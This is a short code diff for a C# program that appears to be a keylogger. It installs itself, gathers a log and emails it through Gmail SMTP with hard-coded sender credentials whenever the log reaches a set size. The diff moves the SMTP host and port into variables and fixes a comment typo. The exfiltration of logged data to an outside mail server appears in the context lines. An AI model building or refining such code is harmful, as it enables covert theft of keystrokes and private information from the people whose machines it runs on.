@@ -21,6 +21,8 @@ namespace abc
 
 		string mailfrom = "mailfrom@gmail.com";
 		string mailfrompassword = "password";
+		string SMTPAddress = "smtp.gmail.com";
+		int SMTPPort = 587;
 
 		System.Windows.Forms.Timer timer1;
 		SmtpClient smtp;
@@ -31,7 +33,7 @@ namespace abc
 			Install();
 
 			logged = "";
-			logsize = int.Parse(logSize) * 512; // log will be send when the file length is reached
+			logsize = int.Parse(logSize) * 512; // log will be sent when the file length is reached
 
 			if (File.Exists(pathLog))
 			{
@@ -104,7 +106,7 @@ namespace abc
 			message = new MailMessage(mailfrom, mailto, computer, logged);
 			message.BodyEncoding = Encoding.UTF8;
 
-			smtp = new SmtpClient("smtp.gmail.com", 587);
+			smtp = new SmtpClient(SMTPAddress, SMTPPort);
 			smtp.UseDefaultCredentials = false;
 			smtp.EnableSsl = true;
 			smtp.DeliveryMethod = SmtpDeliveryMethod.Network;
